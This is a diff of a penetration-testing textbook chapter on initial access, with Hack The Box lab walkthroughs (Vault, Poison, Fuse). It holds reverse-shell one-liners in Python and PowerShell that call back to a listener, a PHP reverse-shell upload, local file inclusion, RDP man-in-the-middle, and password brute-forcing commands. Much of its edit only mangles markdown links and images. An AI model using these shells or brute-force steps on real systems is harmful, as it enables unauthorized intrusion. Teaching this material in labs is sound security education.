@@ -29,11 +29,7 @@ This is not an exhaustive classification and the main point to take from it are 
 
 Before we start looking at these methods of access, we need to review how Linux and Windows provide an interface to the operating system through their respective command terminals or command shells.
 
-## 
-
 ![Principles of a remote shell redirecting stdin, stdout and stderror over a network socket](../.gitbook/assets/0%20%282%29.png)
-
-
 
 This entire process is made simpler through the use of a program called Netcat that can handle the IO redirection for a program over a network. In what is called a “reverse shell”, you start a Netcat session on a local machine to listen for incoming connections:
 
@@ -55,7 +51,7 @@ Although this looks complicated, it is running a bash shell in interactive mode 
 
 At the other end, you can still use Netcat in listening mode to handle the incoming connection.
 
-There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](). An example of a reverse shell written in Python is
+There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](initial-access.md). An example of a reverse shell written in Python is
 
 ```bash
 python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",6001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
@@ -83,16 +79,13 @@ The principles of reverse shells work with Windows as well but you don’t have 
 
 ```bash
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
 ```
 
-  
 When the code passed to powershell.exe's command argument \(-Command\) is expanded, it looks like this:
 
 ```python
 New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001)
 $stream = $client.GetStream()
-[byte[]]$bytes = [byte[]]::new(65536)
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
   $sendback = (iex $data 2>&1 | Out-String )
@@ -104,7 +97,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-The script creates a socket to communicate with the attacker's listener u, creates a buffer to read v  from that socket which will be commands sent by the attacker w, executes the commands sent by the attacker x and gets the response and then writes the response back to the attacker y.
+The script creates a socket to communicate with the attacker's listener u, creates a buffer to read v from that socket which will be commands sent by the attacker w, executes the commands sent by the attacker x and gets the response and then writes the response back to the attacker y.
 
 As with all things Windows, this is slightly more complicated than the Linux versions but functional, nonetheless. Another alternative is to use a “Meterpreter” shell that is designed to work with the pentesting framework Metasploit which you will discuss shortly.
 
@@ -143,19 +136,19 @@ scp -I remote.key localfile.txt user@remote.com:/tmp/remotefile.txt
 
 To copy the remote file to a local file, you just reverse the order of the file paths.
 
-###  SSH Tunnels
+### SSH Tunnels
 
 SSH can be used to create an encrypted tunnel that supports port forwarding. There are two types of port forwarding, local and remote. This can be confusing because local forwarding forwards packets from a local port to a port on a remote machine. Remote port forwarding is the opposite, taking packets for a port on a remote machine and forwarding them to a port on the local machine. As an example, let us imagine that you have ssh'd onto a remote machine that is behind a firewall that doesn't allow any traffic out. You would like to access a web server on our local machine to be able to access file from the remote box. To do this, you could use an SSH tunnel as:
 
 ssh -R 8000:127.0.0.1:8000 user@remoteserver.htb
 
-From the remote machine, you can now access the web server on the local machine by using the URL http://127.0.0.1:8000. Of course, you would need to make sure that nothing was running on port 8000 already on the remote machine.
+From the remote machine, you can now access the web server on the local machine by using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000). Of course, you would need to make sure that nothing was running on port 8000 already on the remote machine.
 
 The converse of this is where you would like to access a port on a remote machine that is only available from that machine. In this case, you use SSH in the same was as before but using the -L flag instead of -R.
 
 ssh -L 8000:127.0.0.1:8000 user@remoteserver.htb
 
-From the local machine, you can access the remote server by once again using the URL http://127.0.0.1:8000.
+From the local machine, you can access the remote server by once again using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000).
 
 A tunnel can be created without actually logging into the machine \(i.e. not running a shell\) by specifying the -N flag.
 
@@ -165,13 +158,13 @@ Specifying individual ports to forward works well when you are interested in a s
 
 Ssh -D 1080 user@remoteserver.htb
 
- Once this is running, a SOCKS proxy can be configured in settings of the browser, or you can use the application proxychains which allows any application that uses the network to send its commands over the SOCKS proxy you have established. For example, to curl a web server running on the remote host on port 8000, you would use proxychains as:
+Once this is running, a SOCKS proxy can be configured in settings of the browser, or you can use the application proxychains which allows any application that uses the network to send its commands over the SOCKS proxy you have established. For example, to curl a web server running on the remote host on port 8000, you would use proxychains as:
 
-proxychains curl http://remoteserver.htb:8000
+proxychains curl [http://remoteserver.htb:8000](http://remoteserver.htb:8000)
 
 Depending on the tool however, there is often built in support for proxying and so with curl for example, the SOCKs proxy can be specified directly:
 
-curl socks5h://localhost:1080 http://remoteserver.htb:8000
+curl socks5h://localhost:1080 [http://remoteserver.htb:8000](http://remoteserver.htb:8000)
 
 Exercise: Initial access and port forwarding on Hack the Box machine Vault
 
@@ -217,7 +210,7 @@ Running Gobuster, but with a modified wordlist to add "sparklays" and "Sparklays
 
 ┌─\[rin@parrot\]─\[~/boxes/Vault\]
 
-└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://vault.htb/sparklays -x .php
+└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://vault.htb/sparklays](http://vault.htb/sparklays) -x .php
 
 &lt;SNIP&gt;
 
@@ -227,11 +220,11 @@ Running Gobuster, but with a modified wordlist to add "sparklays" and "Sparklays
 
 /design \(Status: 301\)
 
-And again, within the /design sub-directory, you find an additional directory /design/uploads. Navigating to the http://vault.htb/sparklays/admin.php returns a login page which doesn't return any errors or other feedback when testing out default username/password combinations like admin/admin. Putting this request into Burp Suite and changing the host header in the request to "localhost" however, you get redirected to another php page " sparklays-local-admin-interface-0001.php" which presents the page shown in Figure 3-2.
+And again, within the /design sub-directory, you find an additional directory /design/uploads. Navigating to the [http://vault.htb/sparklays/admin.php](http://vault.htb/sparklays/admin.php) returns a login page which doesn't return any errors or other feedback when testing out default username/password combinations like admin/admin. Putting this request into Burp Suite and changing the host header in the request to "localhost" however, you get redirected to another php page " sparklays-local-admin-interface-0001.php" which presents the page shown in Figure 3-2.
 
-![Graphical user interface, text, application
+!\[Graphical user interface, text, application
 
-Description automatically generated](../.gitbook/assets/1.png)
+Description automatically generated\]\(../.gitbook/assets/1.png\)
 
 Vault admin panel
 
@@ -249,7 +242,7 @@ listening on \[any\] 6001 ...
 
 We can now navigate to the URL:
 
- http://vault.htb/sparklays/design/uploads/reverse.php5
+[http://vault.htb/sparklays/design/uploads/reverse.php5](http://vault.htb/sparklays/design/uploads/reverse.php5)
 
 This then returns a reverse shell which you can upgrade to a full TTY using the Python and bash commands:
 
@@ -317,23 +310,23 @@ We can now do a local port forward to get access to port 80 on the box 192.168.1
 
 dave@vault.htb's password:
 
-This then allows us to navigate to the web site at http://127.0.0.1:8081 where you get links related to DNS and VPN configuration \(Figure 3-4\).
+This then allows us to navigate to the web site at [http://127.0.0.1:8081](http://127.0.0.1:8081) where you get links related to DNS and VPN configuration \(Figure 3-4\).
 
-![Text
+!\[Text
 
-Description automatically generated](../.gitbook/assets/2%20%282%29.png)
+Description automatically generated\]\(../.gitbook/assets/2%20%282%29.png\)
 
 Home page on port 8081
 
 The first link goes to a page under construction. The second is a page that allows for openvpn configurations to be tested \(Figure 3-5\).
 
-![Graphical user interface, text, application, email
+!\[Graphical user interface, text, application, email
 
-Description automatically generated](../.gitbook/assets/3%20%281%29.png)
+Description automatically generated\]\(../.gitbook/assets/3%20%281%29.png\)
 
 VPN Configurator page
 
-Searching for OpenVPN configuration exploits, you find a blog post by Jacob Baines[\[2\]]() which gives a configuration for returning a reverse shell. Adapting this, you can paste the following into the page, update the file and then click Test VPN.
+Searching for OpenVPN configuration exploits, you find a blog post by Jacob Baines[\[2\]](initial-access.md) which gives a configuration for returning a reverse shell. Adapting this, you can paste the following into the page, update the file and then click Test VPN.
 
 Remote 192.168.122.1
 
@@ -473,11 +466,11 @@ Remote Desktop Protocol
 
 Remote Desktop Protocol \(RDP\) allows user to access their desktop from another machine over a network using the RDP client. The RDP server listens on TCP and UDP port 3389 by default. Users are permitted to use RDP are those in the Remote Desktop Users group. RDP access is one way hackers will gain initial access to a machine if they have a user's credentials. It can also be used to establish persistence, i.e. an easy way to regain access at some later point. In this case, a new user can be created and added to the relevant groups to allow remote desktop access.
 
-RDP is also susceptible to man-in-the-middle attacks. Using software such as Seth[\[3\]](). When Remote Desktop Connection connects through to a machine, it will throw up an error if there is a problem with the TLS certificate. However, it does this with the default self-signed certificate and users are normally used to just ignoring the warning and clicking through. Another issue with man-in-the-middle is if RDP is configured to use Network Level Authentication which Seth is not able to handle. In this scenario, Seth will still be able to capture the plaintext password that was entered into the login screen for the RDP connection, but the connection will then die.
+RDP is also susceptible to man-in-the-middle attacks. Using software such as Seth[\[3\]](initial-access.md). When Remote Desktop Connection connects through to a machine, it will throw up an error if there is a problem with the TLS certificate. However, it does this with the default self-signed certificate and users are normally used to just ignoring the warning and clicking through. Another issue with man-in-the-middle is if RDP is configured to use Network Level Authentication which Seth is not able to handle. In this scenario, Seth will still be able to capture the plaintext password that was entered into the login screen for the RDP connection, but the connection will then die.
 
 There have been a number of exploits of RDP with the most significant recent exploit being BlueKeep \(CVE-2019-0708\) which allowed remote code execution through RDP on Windows 7 and Windows Server 2008 machines.
 
-RDP does not feature in Hack The Box machines, mainly because in the past, it would have been hard to support the many users accessing RDP all at the same time on a VM. However, this is an important technique in an attacker's arsenal and so MITRE for example lists numerous malicious hacker groups as using it to gain access and for lateral movement [\[4\]]().
+RDP does not feature in Hack The Box machines, mainly because in the past, it would have been hard to support the many users accessing RDP all at the same time on a VM. However, this is an important technique in an attacker's arsenal and so MITRE for example lists numerous malicious hacker groups as using it to gain access and for lateral movement [\[4\]](initial-access.md).
 
 Exercise: Using Seth in a Man-in-the-Middle Attack
 
@@ -501,7 +494,7 @@ When you run Seth on the attacker machine and then try and connect using the Rem
 
 ╚════██║██╔══╝ ██║ ██╔══██║ SySS GmbH, 2017
 
-███████║███████╗ ██║ ██║ ██║ https://www.syss.de
+███████║███████╗ ██║ ██║ ██║ [https://www.syss.de](https://www.syss.de)
 
 ╚══════╝╚══════╝ ╚═╝ ╚═╝ ╚═╝
 
@@ -585,7 +578,7 @@ msfvenom -p windows/vncinject/reverse\_tcp LHOST=&lt;Local Host IP address&gt; L
 
 Finally, meterpreter can launch a VNC session by running "run vnc" within a meterpreter session.
 
- Exercise: Exploiting VNC for initial access in Hack The Box machine Poison
+Exercise: Exploiting VNC for initial access in Hack The Box machine Poison
 
 An nmap scan shows that this machine is running FreeBSD and has port 22 \(SSH\) and port 80 \(HTTP\) open.
 
@@ -613,9 +606,9 @@ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 
 Navigating to the website, there is a home page suggesting that various PHP files can be tested \(Figure 4-6\).
 
-![Graphical user interface, text
+!\[Graphical user interface, text
 
-Description automatically generated](../.gitbook/assets/4%20%287%29.png)
+Description automatically generated\]\(../.gitbook/assets/4%20%287%29.png\)
 
 Home page of Poison machine
 
@@ -623,7 +616,7 @@ Inputting one of the filenames listed results in the contents of that file being
 
 Array \( \[0\] =&gt; . \[1\] =&gt; .. \[2\] =&gt; browse.php \[3\] =&gt; index.php \[4\] =&gt; info.php \[5\] =&gt; ini.php \[6\] =&gt; listfiles.php \[7\] =&gt; phpinfo.php \[8\] =&gt; pwdbackup.txt \)
 
- The PHP code is creating an array of filenames. The interesting one is pwdbackup.txt which if we access has the contents:
+The PHP code is creating an array of filenames. The interesting one is pwdbackup.txt which if we access has the contents:
 
 This password is secure, it's encoded atleast 13 times.. what could go wrong really..
 
@@ -643,11 +636,11 @@ Charix!2\#4%6&8\(0
 
 Going back to the home page, the input to the text box is simply being passed as a parameter called "file" to be displayed:
 
-http://poison.htb/browse.php?file=listfiles.php
+[http://poison.htb/browse.php?file=listfiles.php](http://poison.htb/browse.php?file=listfiles.php)
 
 This looks like a candidate for local file inclusion \(LFI\) by tampering with the file parameter. If we try the URL
 
-http://poison.htb/browse.php?file=/etc/passwd
+[http://poison.htb/browse.php?file=/etc/passwd](http://poison.htb/browse.php?file=/etc/passwd)
 
 We get the contents of the passwd file returned.
 
@@ -785,9 +778,9 @@ On our local box, you can confirm that you can access this port by using:
 
 ┌─\[rin@parrot\]─\[~/boxes/Poison\]
 
-└──╼ $proxychains curl --http0.9 http://127.0.0.1:5901
+└──╼ $proxychains curl --http0.9 [http://127.0.0.1:5901](http://127.0.0.1:5901)
 
-ProxyChains-3.1 \(http://proxychains.sf.net\)
+ProxyChains-3.1 \([http://proxychains.sf.net\](http://proxychains.sf.net\)\)
 
 \|S-chain\|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:5901-&lt;&gt;&lt;&gt;-OK
 
@@ -801,7 +794,7 @@ We can then run vncviewer using proxychains. This asks for a password and so try
 
 └──╼ $proxychains vncviewer -passwd secret 127.0.0.1:5901
 
-ProxyChains-3.1 \(http://proxychains.sf.net\)
+ProxyChains-3.1 \([http://proxychains.sf.net\](http://proxychains.sf.net\)\)
 
 \|S-chain\|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:5901-&lt;&gt;&lt;&gt;-OK
 
@@ -817,9 +810,9 @@ Desktop name "root's X desktop \(Poison:1\)"
 
 Which launches a VNC session as root \(Figure 3-7\)
 
-![A picture containing graphical user interface, text
+!\[A picture containing graphical user interface, text
 
-Description automatically generated](../.gitbook/assets/5%20%285%29.png)
+Description automatically generated\]\(../.gitbook/assets/5%20%285%29.png\)
 
 VNC session as root on Poison
 
@@ -877,7 +870,7 @@ PORT STATE SERVICE VERSION
 
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
- On logging in with user anonymous, password anonymous, you find 2 directories, "Backups" and "Engineer". The Backups directory contains an mdb file which indicates that it is a backup of an Access database file. The Engineer directory contains a zip file named "Access Control.zip".
+On logging in with user anonymous, password anonymous, you find 2 directories, "Backups" and "Engineer". The Backups directory contains an mdb file which indicates that it is a backup of an Access database file. The Engineer directory contains a zip file named "Access Control.zip".
 
 To download everything to our machine, we can use wget from our local machine:
 
@@ -887,7 +880,7 @@ To download everything to our machine, we can use wget from our local machine:
 
 --2021-02-28 14:58:13-- ftp://anonymous:\*password\*@access.htb/
 
- =&gt; ‘access.htb/.listing’
+=&gt; ‘access.htb/.listing’
 
 Resolving access.htb \(access.htb\)... 10.129.105.84
 
@@ -909,11 +902,11 @@ access.htb
 
 ├── Backups
 
-│   └── backup.mdb
+│ └── backup.mdb
 
 └── Engineer
 
- └── Access Control.zip
+└── Access Control.zip
 
 2 directories, 2 files
 
@@ -1015,7 +1008,7 @@ It won't be long before you notice that the shell that Telnet provides is limite
 
 Brute forcing remote service passwords
 
-We have already come across some examples of brute forcing passwords \(and usernames\) but we are going to go into the subject a bit more deeply here and look one tool in particular THC Hydra to brute force a variety of remote services. First, it is worth mentioning some background about passwords. The perceived wisdom about passwords has changed with the main recommendation for passwords being length and not complexity \(NIST SP 800-63B \(https://pages.nist.gov/800-63-3/sp800-63b.html\)\). The determination was that adding rules about specific characters and complexity only added a burden on users to remember the password and led to behaviors where users used patterns to choose their passwords. The advent of highly efficient offline password hashing and checking computers along with millions of available breached passwords has led to the increased possibility of a password being brute forced.
+We have already come across some examples of brute forcing passwords \(and usernames\) but we are going to go into the subject a bit more deeply here and look one tool in particular THC Hydra to brute force a variety of remote services. First, it is worth mentioning some background about passwords. The perceived wisdom about passwords has changed with the main recommendation for passwords being length and not complexity \(NIST SP 800-63B \([https://pages.nist.gov/800-63-3/sp800-63b.html\)\](https://pages.nist.gov/800-63-3/sp800-63b.html%29\)\). The determination was that adding rules about specific characters and complexity only added a burden on users to remember the password and led to behaviors where users used patterns to choose their passwords. The advent of highly efficient offline password hashing and checking computers along with millions of available breached passwords has led to the increased possibility of a password being brute forced.
 
 Password hashing depends on the use of a mathematical function that is called a one-way function. It is easy to calculate the hash of a piece of plain text but almost impossible to generate the text from the hash. Hashes are also of fixed length, so no matter how long the piece of text being hashed, the hash itself is always the same length. In the case of the SHA-512 hashing algorithm commonly used on modern Linux-based systems, the output is 64 bytes long. If the only thing that was done with a password was to take the plain text and hash it, it would not be very secure. This is because it would be possible to use tables of pre-computed hashes, called rainbow tables\) for millions of common passwords and compare them to the hash to get a match. That process would be very fast. Even without the rainbow tables, doing a brute force on a dictionary of words by hashing each word and comparing it with the hash we want to crack would also be very fast, especially on modern computers with Graphical Processing Units \(GPUs\).
 
@@ -1031,37 +1024,37 @@ There are two main ways of brute forcing a password: online and offline. We have
 
 …
 
-- \[ Hash modes \] -
+* \[ Hash modes \] -
 
- \# \| Name \| Category
+  \# \| Name \| Category
 
- ======+=====================+======================================
+  ======+=====================+======================================
 
- 900 \| MD4 \| Raw Hash
+  900 \| MD4 \| Raw Hash
 
- 0 \| MD5 \| Raw Hash
+  0 \| MD5 \| Raw Hash
 
- 100 \| SHA1 \| Raw Hash
+  100 \| SHA1 \| Raw Hash
 
- 1300 \| SHA2-224 \| Raw Hash
+  1300 \| SHA2-224 \| Raw Hash
 
- 1400 \| SHA2-256 \| Raw Hash
+  1400 \| SHA2-256 \| Raw Hash
 
- 10800 \| SHA2-384 \| Raw Hash
+  10800 \| SHA2-384 \| Raw Hash
 
- 1700 \| SHA2-512 \| Raw Hash
+  1700 \| SHA2-512 \| Raw Hash
 
- 17300 \| SHA3-224 \| Raw Hash
+  17300 \| SHA3-224 \| Raw Hash
 
- 17400 \| SHA3-256 \| Raw Hash
+  17400 \| SHA3-256 \| Raw Hash
 
- 17500 \| SHA3-384 \| Raw Hash
+  17500 \| SHA3-384 \| Raw Hash
 
- 17600 \| SHA3-512 \| Raw Hash
+  17600 \| SHA3-512 \| Raw Hash
 
- 6000 \| RIPEMD-160 \| Raw Hash
+  6000 \| RIPEMD-160 \| Raw Hash
 
- 600 \| BLAKE2b-512 \| Raw Hash
+  600 \| BLAKE2b-512 \| Raw Hash
 
 …
 
@@ -1095,27 +1088,27 @@ The expression \[\[:upper:\]\] matches uppercase letters and the ^ within the \[
 
 The approach of taking a password list and refining it certainly makes the process of cracking faster, provided the password you are looking for is in the list. However, even though a person may use a common password, they will often change it by altering numbers at the end, either a sequence or referring to a specific date for example. A fan of the French soccer team may have the password France2018 representing one of the years that France won the FIFA World Cup.
 
-The tool CUPP \(Common User Passwords Profiler\) \(https://github.com/Mebus/cupp\) will ask a series of questions about a target to create a set of possible password combinations. Of course this relies on having access to personal information about the target such as their family members' names, dates of birth, pet names, work and hobbies.
+The tool CUPP \(Common User Passwords Profiler\) \([https://github.com/Mebus/cupp\](https://github.com/Mebus/cupp\)\) will ask a series of questions about a target to create a set of possible password combinations. Of course this relies on having access to personal information about the target such as their family members' names, dates of birth, pet names, work and hobbies.
 
-Another approach is to crawl a company website for potential words that could be used as a password using a tool like CeWL \(Custom Word List Generator https://digi.ninja/projects/cewl.php\). Again, this isn't sophisticated, it just takes words that it finds and creates a password list.
+Another approach is to crawl a company website for potential words that could be used as a password using a tool like CeWL \(Custom Word List Generator [https://digi.ninja/projects/cewl.php\](https://digi.ninja/projects/cewl.php\)\). Again, this isn't sophisticated, it just takes words that it finds and creates a password list.
 
-Once you have a wordlist, you can use tools to take the words and create different combinations to create a more extensive list of passwords. One of these is Mentalist \(git clone https://github.com/sc0tfree/mentalist.git\) which allows you to take a wordlist and then apply a chain of transformations that will do things like change case, substitute numbers for letters and other substitutions \(e.g. zero instead of the letter O, 3 instead of e, 5 instead of s\) and to take things like zip or postal codes and other words and prepend or postpend them to the word. You can either use this to generate a new dictionary to use for cracking, or create a set of rules that can be directly used by John The Ripper or Hashcat.
+Once you have a wordlist, you can use tools to take the words and create different combinations to create a more extensive list of passwords. One of these is Mentalist \(git clone [https://github.com/sc0tfree/mentalist.git\](https://github.com/sc0tfree/mentalist.git\)\) which allows you to take a wordlist and then apply a chain of transformations that will do things like change case, substitute numbers for letters and other substitutions \(e.g. zero instead of the letter O, 3 instead of e, 5 instead of s\) and to take things like zip or postal codes and other words and prepend or postpend them to the word. You can either use this to generate a new dictionary to use for cracking, or create a set of rules that can be directly used by John The Ripper or Hashcat.
 
 We will go through an example of generating a custom word list in a moment, but first we can turn to tools for testing passwords directly with an application online. This has become much more challenging recently with improvements in applications that will lock users out after a small number of failed login attempts. However, it can still work where these protections have not been applied, websites with poor security practices, services that do not have the means for password protections of this sort and devices like the Internet of Things where again, password protection is not implemented by default.
 
 Online Password Brute Force
 
-We have already seen a number of tools that can be used to test usernames and passwords for specific remote services. The most comprehensive of these is THC Hydra \(https://github.com/vanhauser-thc/thc-hydra\) which supports more than 50 different protocols. The basic syntax of Hydra is illustrated in the examples printed out with the use of hydra -h
+We have already seen a number of tools that can be used to test usernames and passwords for specific remote services. The most comprehensive of these is THC Hydra \([https://github.com/vanhauser-thc/thc-hydra\](https://github.com/vanhauser-thc/thc-hydra\)\) which supports more than 50 different protocols. The basic syntax of Hydra is illustrated in the examples printed out with the use of hydra -h
 
- hydra -l user -P passlist.txt ftp://192.168.0.1
+hydra -l user -P passlist.txt ftp://192.168.0.1
 
- hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
 
- hydra -C defaults.txt -6 pop3s://\[2001:db8::1\]:143/TLS:DIGEST-MD5
+hydra -C defaults.txt -6 pop3s://\[2001:db8::1\]:143/TLS:DIGEST-MD5
 
- hydra -l admin -p password ftp://\[192.168.0.0/24\]/
+hydra -l admin -p password ftp://\[192.168.0.0/24\]/
 
- hydra -L logins.txt -P pws.txt -M targets.txt ssh
+hydra -L logins.txt -P pws.txt -M targets.txt ssh
 
 The -l and -p flags expect a username and password respectively. The capital versions -L and -P will accept files of usernames and passwords. The service is of the format:
 
@@ -1245,11 +1238,11 @@ Host script results:
 
 The OS discovery suggests that the box is a Windows Server 2016. The variety of ports like DNS, LDAP and Kerberos suggest that it is an Active Directory domain controller with the domain fabricorp.local. We can add this hostname to the /etc/hosts file. An interesting note at this point is whether add the fabricorp.local DNS to the list of nameservers to query so that any other subdomains would be accessible automatically. You can normally do this by adding the entry nameserver &lt;IP address&gt; to the file /etc/resolv.conf. However, in this case, the DNS returned the incorrect IP address for fabricorp.local and so this is not an option.
 
-Going to the website, we get redirected to the URL http://fuse.fabricorp.local/papercut/logs/html/index.htm and so we can add fuse.fabricorp.local to the /etc/hosts file as well. This gives us a page shown in Figure 4-8.
+Going to the website, we get redirected to the URL [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm) and so we can add fuse.fabricorp.local to the /etc/hosts file as well. This gives us a page shown in Figure 4-8.
 
-![Graphical user interface
+!\[Graphical user interface
 
-Description automatically generated](../.gitbook/assets/6.png)
+Description automatically generated\]\(../.gitbook/assets/6.png\)
 
 fuse.fabricorp.local home page. A PaperCut printing administration page.
 
@@ -1271,21 +1264,21 @@ bhult
 
 administrator
 
-We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain. To get kerbrute, you can download a release from https://github.com/ropnop/kerbrute. Running this with the users listed above, we get:
+We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain. To get kerbrute, you can download a release from [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute). Running this with the users listed above, we get:
 
 ┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
 
 └──╼ $kerbrute userenum -d fabricorp.local --dc fabricorp.local users.txt
 
- \_\_ \_\_ \_\_
+\_\_ \_\_ \_\_
 
- / /\_\_\_\_\_ \_\_\_\_\_/ /\_ \_\_\_\_\_\_\_ \_\_/ /\_\_\_\_
+/ /\_\_\_\_\_ \_\_\_\_\_/ /\_ \_\_\_\_\_\_\_ \_\_/ /\_\_\_\_
 
- / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
+/ //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
 
- / ,&lt; / \_\_/ / / /\_/ / / / /\_/ / /\_/ \_\_/
+/ ,&lt; / \_\_/ / / /\_/ / / / /\_/ / /\_/ \_\_/
 
-/\_/\|\_\|\\_\_\_/\_/ /\_.\_\_\_/\_/ \\_\_,\_/\\_\_/\\_\_\_/
+/\_/\|\_\|\_\_\_/\_/ /\_.\_\_\_/\_/ \_\_,\_/\_\_/\_\_\_/
 
 Version: v1.0.3 \(9dad6e1\) - 12/21/20 - Ronnie Flathers @ropnop
 
@@ -1309,9 +1302,9 @@ Now that we have valid usernames, we need password candidates and a place to try
 
 ┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
 
-└──╼ $cewl -d 3 -m 8 --with-numbers -w fabricorp\_wordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm
+└──╼ $cewl -d 3 -m 8 --with-numbers -w fabricorp\_wordlist.txt [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm)
 
-CeWL 5.4.8 \(Inclusion\) Robin Wood \(robin@digi.ninja\) \(https://digi.ninja/\)
+CeWL 5.4.8 \(Inclusion\) Robin Wood \(robin@digi.ninja\) \([https://digi.ninja/\](https://digi.ninja/\)\)
 
 We have specified a depth of 3 \(-d 3\) for the program to crawl, a minimum password length of 8 \(-m 8\), we want words that contain numbers \(--with-numbers\) and an output file fabricorp\_wordlist.txt and the URL of the home page we want to crawl. This generates a wordlist of the type:
 
@@ -1379,7 +1372,7 @@ An alternative to crackmapexec is medusa which can be used with the the user fil
 
 └──╼ $medusa -h fuse.htb -U users.txt -P fabricorp\_wordlist.txt -M smbnt
 
-Medusa v2.2 \[http://www.foofus.net\] \(C\) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
+Medusa v2.2 \[[http://www.foofus.net\](http://www.foofus.net\)\] \(C\) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
 
 ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: PaperCut \(1 of 45 complete\)
 
@@ -1477,21 +1470,21 @@ rpcclient $&gt;
 
 We can collect all of the users and create a new users file with these users in it called rpc\_users.txt and then just extract the usernames with the command:
 
-cat rpc\_users.txt \| awk -F '\\\[\|\]' '{print $2}' &gt; rpc\_users2.txt
+cat rpc\_users.txt \| awk -F '\\[\|\]' '{print $2}' &gt; rpc\_users2.txt
 
-The awk command uses the -F flag to specify the field separator regular expression. We are separating the text between the square bracket \(\[\]\) characters. The '\\' is necessary to escape the first \[. If we try and write to the same file, it will end up blank and so that is why we need to create a separate file.
+The awk command uses the -F flag to specify the field separator regular expression. We are separating the text between the square bracket \(\[\]\) characters. The '\' is necessary to escape the first \[. If we try and write to the same file, it will end up blank and so that is why we need to create a separate file.
 
 Back on rpcclient, we can look at printers that might be shared by using the enumprinters command. This gives output which contains a password:
 
 rpcclient $&gt; enumprinters
 
- flags:\[0x800000\]
+flags:\[0x800000\]
 
- name:\[\\10.129.70.212\HP-MFT01\]
+name:\[\10.129.70.212\HP-MFT01\]
 
- description:\[\\10.129.70.212\HP-MFT01,HP Universal Printing PCL 6,Central \(Near IT, scan2docs password: $fab@s3Rv1ce$1\)\]
+description:\[\10.129.70.212\HP-MFT01,HP Universal Printing PCL 6,Central \(Near IT, scan2docs password: $fab@s3Rv1ce$1\)\]
 
- comment:\[\]
+comment:\[\]
 
 rpcclient $&gt;
 
@@ -1522,7 +1515,5 @@ Info: Establishing connection to remote endpoint
 The user flag is in c:\Users\svc-print\Desktop\users.txt.
 
 We will leave this here and come back to Fuse in a subsequent chapter where we cover further enumeration for discovery and privilege escalation. Next however we are going to explore custom exploitation as a means of gaining initial access.
-
-
 
 1. 
